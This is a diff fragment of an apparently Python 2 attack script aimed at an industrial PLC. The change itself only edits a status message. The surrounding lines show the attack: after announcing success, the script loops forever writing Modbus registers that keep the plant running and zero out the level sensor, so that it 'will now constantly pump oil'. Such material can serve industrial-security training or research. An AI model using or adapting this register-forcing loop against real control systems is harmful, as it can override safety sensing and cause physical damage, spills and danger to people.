@@ -52,7 +52,7 @@ try:
     print ". . . Attacking PLC at " + args.target
     time.sleep(1)
     print ". . . Attack successful!"
-    print "PLC will now constantly pump oil"
+    print ". . . PLC will now constantly pump oil"
     while True:
         rq = client.write_register(0x01, 1) # Run Plant, Run!
         rq = client.write_register(0x02, 0) # Level Sensor
